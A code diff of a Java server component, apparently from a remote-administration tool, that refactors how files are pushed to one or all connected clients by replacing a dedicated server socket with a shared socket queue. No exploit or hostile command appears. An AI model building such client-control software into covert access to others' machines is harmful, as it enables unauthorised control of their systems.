@@ -3,8 +3,7 @@ package br.com.introcdc.connect.server.components;
  * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 18:21
  */
 
-import br.com.introcdc.connect.Connect;
-import br.com.introcdc.connect.client.components.InstallComponents;
+import br.com.introcdc.connect.client.components.ClientInstallComponents;
 import br.com.introcdc.connect.server.ConnectServer;
 import br.com.introcdc.connect.server.components.settings.FileInfo;
 import br.com.introcdc.connect.server.connection.ClientHandler;
@@ -15,15 +14,16 @@ import java.awt.*;
 import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
 import java.io.*;
-import java.net.ServerSocket;
 import java.net.Socket;
 import java.nio.file.FileVisitResult;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.SimpleFileVisitor;
 import java.nio.file.attribute.BasicFileAttributes;
-import java.util.List;
 import java.util.*;
+import java.util.List;
+import java.util.concurrent.BlockingQueue;
+import java.util.concurrent.LinkedBlockingQueue;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicReference;
 import java.util.regex.Pattern;
@@ -31,6 +31,8 @@ import java.util.zip.ZipEntry;
 import java.util.zip.ZipOutputStream;
 
 public class ServerFileComponents {
+
+    public static BlockingQueue<Socket> sendFileSockets = new LinkedBlockingQueue<>();
 
     public static final Pattern LINE_PATTERN = Pattern.compile("^(?<slash>/?)\\[(?<index>\\d+)\\]\\s+(?<name>.*?)\\s*\\|\\s*(?<info>.+)$");
     public static JFrame FRAME = null;
@@ -157,7 +159,7 @@ public class ServerFileComponents {
                         if (oldCard != null) {
                             oldCard.setBorder(BorderFactory.createCompoundBorder(
                                     BorderFactory.createLineBorder(
-                                            oldCard.getName().equalsIgnoreCase(InstallComponents.LOCAL_FILE) ? Color.RED : new Color(80, 90, 110), 1, true
+                                            oldCard.getName().equalsIgnoreCase(ClientInstallComponents.LOCAL_FILE) ? Color.RED : new Color(80, 90, 110), 1, true
                                     ),
                                     BorderFactory.createEmptyBorder(6, 6, 6, 6)
                             ));
@@ -431,7 +433,7 @@ public class ServerFileComponents {
         card.setName(fileInfo.getFileName());
         card.setBorder(BorderFactory.createCompoundBorder(
                 BorderFactory.createLineBorder(
-                        fileInfo.getFileName().equalsIgnoreCase(InstallComponents.LOCAL_FILE) ? Color.RED : new Color(80, 90, 110), 1, true
+                        fileInfo.getFileName().equalsIgnoreCase(ClientInstallComponents.LOCAL_FILE) ? Color.RED : new Color(80, 90, 110), 1, true
                 ),
                 BorderFactory.createEmptyBorder(6, 6, 6, 6)
         ));
@@ -572,7 +574,7 @@ public class ServerFileComponents {
         ConnectServer.msg("Preparando-se para enviar arquivo" + (ConnectServer.SELECTED_CLIENT == -1 ? " para todos os clientes..." : "..."));
         File fileToSend = file;
         boolean temporary = temp;
-        ConnectServer.EXECUTOR.schedule(() -> new Thread(() -> {
+        ConnectServer.EXECUTOR.schedule(ConnectServer.runnable(() -> new Thread(() -> {
             int toSend = 1;
             if (ConnectServer.SELECTED_CLIENT == -1) {
                 if (ConnectServer.CLIENTS.isEmpty()) {
@@ -589,10 +591,10 @@ public class ServerFileComponents {
                 client.send("send " + fileToSend.getName());
             }
 
-            try (ServerSocket serverSocket = new ServerSocket(Connect.PORT + 4)) {
+            try {
                 int connected = 0;
                 while (connected < toSend) {
-                    try (Socket clientSocket = serverSocket.accept();
+                    try (Socket clientSocket = sendFileSockets.take();
                          DataOutputStream dos = new DataOutputStream(clientSocket.getOutputStream());
                          BufferedInputStream bis = new BufferedInputStream(new FileInputStream(fileToSend))) {
                         connected++;
@@ -624,7 +626,7 @@ public class ServerFileComponents {
             } catch (Exception exception) {
                 ConnectServer.msg("Ocorreu um erro ao enviar o arquivo para o cliente! (" + exception.getMessage() + ")");
             }
-        }).start(), 100, TimeUnit.MILLISECONDS);
+        }).start()), 100, TimeUnit.MILLISECONDS);
     }
 
     public static void handleUpdate() {
